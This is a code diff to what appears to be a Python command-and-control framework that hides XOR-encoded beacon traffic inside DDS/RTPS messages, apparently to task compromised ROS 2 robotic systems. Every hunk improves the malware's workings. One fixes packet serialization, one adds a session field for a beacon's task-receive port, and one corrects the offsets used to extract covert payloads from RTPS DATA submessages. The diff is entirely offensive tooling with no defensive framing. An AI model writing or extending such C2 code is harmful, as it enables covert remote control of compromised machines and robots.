@@ -88,7 +88,7 @@ class C2Packet:
             "n":  self.seq,
             "ts": self.timestamp,
             "p":  self.payload,
-        }).encode()
+        }, ensure_ascii=True, default=str).encode("utf-8")
         return C2_MAGIC + _xor_encode(raw, key)
 
     @staticmethod
@@ -118,6 +118,7 @@ class C2Session:
     last_seen:   float = field(default_factory=time.time)
     checkins:    int   = 0
     hostname:    str   = ""
+    reply_port:  int   = 0     # beacon's dedicated task-receive port
     ros_nodes:   List[str] = field(default_factory=list)
     tasks_sent:  List[dict] = field(default_factory=list)
     results:     List[dict] = field(default_factory=list)
@@ -277,9 +278,15 @@ class C2Transport:
             flags = data[offset + 1]
             size  = struct.unpack_from("<H", data, offset + 2)[0]
             body  = data[offset + 4: offset + 4 + size]
-            if kind == 0x15 and len(body) > 12:
-                # Skip fixed DATA fields (12 bytes) + 4-byte CDR encapsulation header
-                payload_start = 12 + 4
+            if kind == 0x15 and len(body) > 24:
+                # Builder layout (bytes from body start):
+                #   0: extraFlags(2) + octetsToInlineQos(2)  = 4B
+                #   4: entityIds packed as 2×short           = 4B
+                #   8: sequenceNumber lo(4) + hi(4)          = 8B
+                #  16: CDR encapsulation kind(2) + opts(2)   = 4B
+                #  20: payload length (I)                    = 4B  ← payload_start
+                #  24: payload bytes
+                payload_start = 20
                 if payload_start + 4 <= len(body):
                     plen = struct.unpack_from("<I", body, payload_start)[0]
                     raw  = body[payload_start + 4: payload_start + 4 + plen]
